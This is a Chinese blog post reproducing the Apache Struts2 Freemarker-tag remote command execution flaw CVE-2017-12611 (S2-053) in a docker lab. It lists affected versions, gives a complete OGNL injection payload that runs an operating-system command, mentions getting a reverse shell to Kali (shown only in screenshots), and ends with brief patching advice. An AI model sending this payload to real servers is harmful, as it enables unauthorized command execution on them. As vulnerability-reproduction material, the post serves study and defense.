# Apache struts2 Freemarker标签远程命令执行_CVE-2017-12611(S2-053)漏洞复现 - 雨中落叶 - 博客园

> 原文：[https://www.cnblogs.com/yuzly/p/11185927.html](https://www.cnblogs.com/yuzly/p/11185927.html)

Apache struts2 Freemarker标签远程命令执行_CVE-2017-12611(S2-053)漏洞复现

**一、漏洞描述**

Struts2在使用Freemarker模块引擎的时候,同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析,但是由于被Freemarker解析一次后变成离开一个表达式,被OGNL解析第二次,导致任意命令执行漏洞。

**二、漏洞影响版本**

Struts 2.0.1-struts 2.3.33

Struts 2.5-Struts 2.5.10

**三、漏洞环境搭建**

1.使用docker搭建环境

**四、漏洞复现**

1、启动环境

　　![](../Images/8a469f2dd7adbc44291041ab34ce7116.png)

2、浏览器访问

　　![](../Images/fa3a281ef1a404d66e152dd9d13e590a.png)

POC如下:

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
注: 执行命令的地方在于(#cmd=’id’)
```

3、查看用户所属组

　　![](../Images/0a14df5799571005054dcc9d2aff6a83.png)

4、反弹shell,把shell反弹到kali上

　　![](../Images/dc1c16fdecc514cfc3248b4d3ab67539.png)

5、在kali 端开启监听,可以看到成功获得目标反弹过来的shell

　　![](../Images/376bad47593e473e6bd70cc72c54ce2e.png)

**五、漏洞防御**

1、 Apache Struts版本最新版本

2、 Freemarker标签不要通过Request方式获取